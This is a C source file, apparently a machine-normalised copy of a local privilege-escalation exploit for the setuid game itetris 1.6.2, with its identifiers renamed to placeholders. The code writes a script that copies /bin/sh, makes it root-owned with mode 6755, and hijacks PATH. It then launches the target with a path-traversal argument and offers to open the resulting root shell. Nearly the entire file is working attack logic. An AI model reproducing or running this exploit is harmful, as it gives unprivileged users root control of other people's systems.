
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int tmpfile ;
struct stat {int st_mode; } ;
typedef int path ;
typedef int fakefile ;
typedef int cmd ;
typedef int FILE ;


 char* VAR_0 ;
 char* VAR_1 ;
 char* VAR_2 ;
 char* VAR_3 ;
 char* VAR_4 ;
 int FUNC_0 (char*,int) ;
 int FUNC_1 (char*,char*,int ) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int *) ;
 int * FUNC_4 (char*,char*) ;
 int FUNC_5 (int *,char*,...) ;
 char* FUNC_6 (char*) ;
 int FUNC_7 (char*,char*) ;
 int FUNC_8 (char*,char*) ;
 int FUNC_9 (char*,char*,int) ;
 int FUNC_10 (int) ;
 int FUNC_11 (char*,int,char*,char*,char*,...) ;
 scalar_t__ FUNC_12 (char*,struct stat*) ;
 int * VAR_5 ;
 int FUNC_13 (char*) ;
 int FUNC_14 (char*) ;

FUNC_15(){
 char VAR_6[256],VAR_7[256],VAR_8[256],VAR_9[1024],VAR_10[0];
 struct stat VAR_11,VAR_12;
 FILE *VAR_13,*VAR_14;
 FUNC_5(VAR_5,"[ (*)itetris[v1.6.2] local root exploit, by: v9[v9@fakehalo.o"
 "rg]. ]\n");
 FUNC_5(VAR_5,"[*] checking %s for proper file permissions.\n",VAR_3);
 if(FUNC_12(VAR_3,&VAR_11)){
  FUNC_5(VAR_5,"[!] failed, %s doesnt appear to exist.\n",VAR_3);
  FUNC_2(1);
 }
 else if(VAR_11==35309){
  FUNC_5(VAR_5,"[*] done, %s appears to be setuid.\n",VAR_3);
 }
 else{
  FUNC_5(VAR_5,"[!] failed, %s doesn't appear to be setuid.\n",VAR_3);
  FUNC_2(1);
 }
 FUNC_5(VAR_5,"[*] done, making temporary files.\n");
 FUNC_11(VAR_8,sizeof(VAR_8),"%s/%s",VAR_0,VAR_2);
 FUNC_11(VAR_7,sizeof(VAR_7),"%s/%s",VAR_0,VAR_1);
 FUNC_14(VAR_8);VAR_14=FUNC_4(VAR_8,"w");FUNC_3(VAR_14);
 FUNC_14(VAR_7);VAR_13=FUNC_4(VAR_7,"w");
 FUNC_5(VAR_13,"#!/bin/sh\n");
 FUNC_5(VAR_13,"cp /bin/sh %s\n",VAR_4);
 FUNC_5(VAR_13,"chown 0.0 %s\n",VAR_4);
 FUNC_5(VAR_13,"chmod 6755 %s\n",VAR_4);
 FUNC_3(VAR_13);
 FUNC_0(VAR_7,33261);
 FUNC_5(VAR_5,"[*] done, setting up environment variable(s).\n");
 FUNC_11(VAR_9,sizeof(VAR_9),"%s:%s",VAR_0,FUNC_6("PATH"));
 FUNC_9("PATH",VAR_9,1);
 FUNC_5(VAR_5,"[*] done, launching %s. (the screen may blink locally)\n",
 VAR_3);
 FUNC_10(1);
 FUNC_11(VAR_6,sizeof(VAR_6),"%s -VE -F../../../../%s/%s 1>/dev/null 2>&1",VAR_3,
 VAR_0,VAR_2);
 FUNC_13(VAR_6);
 FUNC_5(VAR_5,"[*] done, cleaning up temporary files.\n");
 FUNC_14(VAR_8);FUNC_14(VAR_7);
 FUNC_5(VAR_5,"[*] done, checking %s for proper file permissions.\n",
 VAR_4);
 if(FUNC_12(VAR_4,&VAR_12)){
  FUNC_5(VAR_5,"[!] failed, %s doesnt appear to exist.\n",VAR_4);
  FUNC_2(1);
 }
 else if(VAR_12==36333){
  FUNC_5(VAR_5,"[*] success! %s appears to be set*id.\n",VAR_4);
 }
 else{
  FUNC_5(VAR_5,"[!] failed, %s doesn't appear to be set*id.\n",VAR_4);
  FUNC_2(1);
 }
 FUNC_5(VAR_5,"[?] do you wish to enter the rootshell now(y/n)?: ");
 FUNC_8("%s",VAR_10);
 if(VAR_10[0]!=0x59&&VAR_10[0]!=0x79){
  FUNC_7("[*] aborted, the rootshell is: %s.\n",VAR_4);
 }
 else{
  FUNC_7("[*] ok, executing rootshell(%s) now.\n",VAR_4);
  FUNC_1(VAR_4,VAR_4,0);
 }
 FUNC_5(VAR_5,"[*] exiting program successfully.\n");
 FUNC_2(0);
}
